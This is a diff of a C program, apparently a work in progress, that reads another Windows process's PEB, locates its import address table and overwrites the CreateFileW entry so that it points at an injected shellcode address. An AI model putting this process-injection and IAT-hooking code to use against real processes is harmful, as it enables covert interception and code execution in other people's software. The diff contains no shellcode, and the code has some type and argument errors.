@@ -191,7 +191,7 @@ int main()
 
 	NTSTATUS ntstat = ntqueryip(hProcess, PROC_INFORMATION_CLASS, PebBuffer, PROC_INFORMATION_LENGTH, InfoLength);
 
-	ULONG *PebBaseAddress = PebBuffer->PebBaseAddress;	
+	ULONG64 PebBaseAddress = PebBuffer->PebBaseAddress;	
 	printf("NtQueryInformationProcess status: %x \n", ntstat);
 	printf("Bytes written: %d \n", InfoLength);
 	printf("Address of PEB in target process: %#016x \n", PebBaseAddress); 
@@ -208,25 +208,24 @@ int main()
 		image_section_header.VirtualAddress = IdataSectionAddress	
 	
 	two_ways:	
-	*	optionalheader.image_data_directory[1] is import directory section address, contains dll image_import_descriptors(dll names and iat rva) 	
+
+	*	optionalheader.image_data_directory[1] is import directory section address, contains image_import_descriptors(dll names and iat rva) 	
 			0: ImportDirectoryTable -> first image_import_descriptor
 			(contains directory entries for imported dlls, last entry contains 0)
 			
-			if(image_import_descriptor.Name == "target.dll")
-				iat = image_import_descriptor.FirstThunk(image_thunk_data)	
+			if(image_import_descriptor->original_thunk_data->image_import_by_name->Name == "target.dll")
+				iat_of_dll = image_import_descriptor->FirstThunk
+				function_name_list = image_import_descriptor->OriginalFirstThunk (array of thunk_data, pointing to image_import_by_name struct)
 		
-			first_thunk.Function -> address of dll function
-			first_thunk.AddressOfData -> image_import_by_name
-			image_import_by_name.Name -> function name
 
-	*	optionalheader.image_data_directory[12] is IAT section address	// import address table of all dll-functions, zero entry separated - corresponding dllname in import directory table
-			iat[0] -> image_thunk_data	
-			loop until function address is found 	
+	*	optionalheader.image_data_directory[12] is IAT section address	// import address table of all dll-functions, zero entry separated - corresponding dllname in import lookup table
+			iat[0] -> address of first imported function	
+			with function offset in iat, hooking possible
 			
 	*/ 
 
 	PPEB ProcessEnvironmentBlock = malloc(sizeof(PEB));	
-	VOID *ImageBaseAddress;
+	ULONG64 ImageBaseAddress;
 	ULONG bytes_read = 0; 
 	BOOL res = ReadProcessMemory(hProcess, PebBaseAddress, ProcessEnvironmentBlock, sizeof(PEB), &bytes_read);
 	if(!res){
@@ -270,18 +269,21 @@ int main()
 		
 	*/
 	// needed variables for code injection
-	VOID *CodeSectionEnd;  // place for injection of code
+	ULONG64 CodeSectionEnd;  // place for injection of code
 	IMAGE_DATA_DIRECTORY *IATDirectory;
-	VOID *IATaddress; // iat base address
+	ULONG64 IATaddress; // iat base address
+	ULONG64 IDTaddress; // iat base address
 
 	// find .idata section
 	IMAGE_OPTIONAL_HEADER OptionalHeader = NtHeaders->OptionalHeader;
 	IATaddress = OptionalHeader.DataDirectory[12].VirtualAddress; 
+	IDTaddress = OptionalHeader.DataDirectory[1].VirtualAddress; 
 	//IATaddress = IATDirectory->VirtualAddress + (int)ImageBaseAddress;
-	printf("IAT @: %#018x \n", (int)IATaddress + (int)ImageBaseAddress);
+	printf("IAT @: %#018x \n", IATaddress + ImageBaseAddress);
+	printf("IDT @: %#018x \n", IDTaddress + ImageBaseAddress);
 
 	// first section follows NtHeaders	
-	PVOID SectionHeaderBaseAddress = (VOID *) NtHeadersBaseAddress + sizeof(IMAGE_NT_HEADERS);
+	ULONG64 SectionHeaderBaseAddress = (VOID *) NtHeadersBaseAddress + sizeof(IMAGE_NT_HEADERS);
 	printf("SizeOfHeaders: %#010x \n", sizeof(IMAGE_NT_HEADERS));
 	printf("NtHeadersBaseAddress: %#010x \n", NtHeadersBaseAddress);
 	printf("SectionHeaderBaseAddress: %#010x \n", SectionHeaderBaseAddress);
@@ -305,17 +307,51 @@ int main()
 			}
 		}
 
-		SectionHeaderBaseAddress = (VOID *) SectionHeaderBaseAddress + sizeof(IMAGE_SECTION_HEADER);
+		SectionHeaderBaseAddress = SectionHeaderBaseAddress + sizeof(IMAGE_SECTION_HEADER);
 	}
 
 
 
 	/*
-		Finding IAT entries
+		Hooking IAT entry
+			- saving original address
+			- placing shellcode (jmp to original function after shellcode)
+			- writing address to shellcode to iat entry
 
 	*/
 	
-				
+	// entry with offset 0x150 is createfilew in target application (determined with iat in debugger). it is also possible to determine offset via ilt
+	
+	ULONG64 OriginalIATEntry = ImageBaseAddress + IATaddress + 0x150;
+	printf("CreateFileW Function Address: %#018x \n", OriginalIATEntry);
+	ULONG64 ShellcodeAddress = CodeSectionEnd - 0x50; 	
+	printf("Shellcode address: %#018x \n", ShellcodeAddress);
+
+	ULONG64 OriginalFunctionPointer;
+	res = ReadProcessMemory(hProcess, OriginalIATEntry, &OriginalFunctionPointer, sizeof(ULONG64), &bytes_read);
+	if(!res){
+		printf("ReadProcessMemory failed reading OriginalFunctionPointer.\n");
+	} else {
+		printf("OriginalFunctionPointer: %#018x \n", OriginalFunctionPointer);
+	}
+	
+
+	res = VirtualProtectEx(hProcess, OriginalIATEntry, 8, PAGE_EXECUTE_READWRITE, &res);
+	if( res == NULL)
+		printf("READ_WRITE_EXECUTE rights failed. \n");
+		
+	res = WriteProcessMemory(hProcess, OriginalIATEntry, &ShellcodeAddress, sizeof(ULONG64), &bytes_read);
+	if(!res){
+		printf("WriteProcessmemory failed writing to IAT: %d \n", GetLastError());
+	} else {
+		printf("IAT-Entry changed.\n");
+	}
+
+	
+
+		
+	
+	//IATaddress				
 	
 		
 	
